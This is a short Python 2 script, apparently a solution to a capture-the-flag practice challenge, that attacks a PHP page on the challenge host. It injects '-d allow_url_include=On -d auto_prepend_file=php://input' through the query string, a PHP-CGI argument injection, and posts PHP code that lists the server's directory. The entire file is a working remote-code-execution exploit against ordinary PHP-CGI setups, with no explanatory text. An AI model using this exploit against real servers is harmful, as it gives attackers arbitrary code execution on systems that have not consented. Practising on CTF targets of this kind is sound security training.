#!/usr/bin/env python
# coding: UTF-8

import urllib
import urllib2
import requests


def main():
	url = 'http://ctfq.sweetduet.info:10080/~q12/index.php'
	code = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
	values = '''
	<?php
	$res_dir = opendir( '.' );
	while( $file_name = readdir( $res_dir ) ){
		print "{$file_name}\n";
	}
	closedir( $res_dir );
	?>
	'''
	req = requests.post(url+code, data=values)
	print req.text

if __name__ == '__main__':
	main()
